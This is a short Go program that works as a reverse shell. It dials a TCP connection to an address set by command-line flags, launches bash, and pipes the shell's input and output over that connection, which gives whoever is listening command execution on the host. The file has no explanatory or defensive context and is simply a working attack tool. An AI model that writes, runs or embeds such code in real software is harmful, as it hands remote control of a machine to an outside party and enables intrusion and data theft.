package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

var (
	dstIp   = flag.String("dst", "127.0.0.1", "Destination IP")
	dstPort = flag.Int("port", 3344, "Destination Port")
)

func main() {
	flag.Parse()

	dstAddr := fmt.Sprintf("%s:%d", *dstIp, *dstPort)
	conn, err := net.Dial("tcp", dstAddr)
	checkErr(err)

	fmt.Println("Connected, spawing shell...")

	shell := exec.Command("bash")

	outp, err := shell.StdoutPipe()
	checkErr(err)

	inp, err := shell.StdinPipe()
	checkErr(err)

	go io.Copy(conn, outp)
	go io.Copy(inp, conn)

	err = shell.Run()
	checkErr(err)

	err = shell.Wait()
	checkErr(err)
}

func checkErr(err error) {
	if err != nil {
		log.Fatal("FatalError:", err)
	}
}
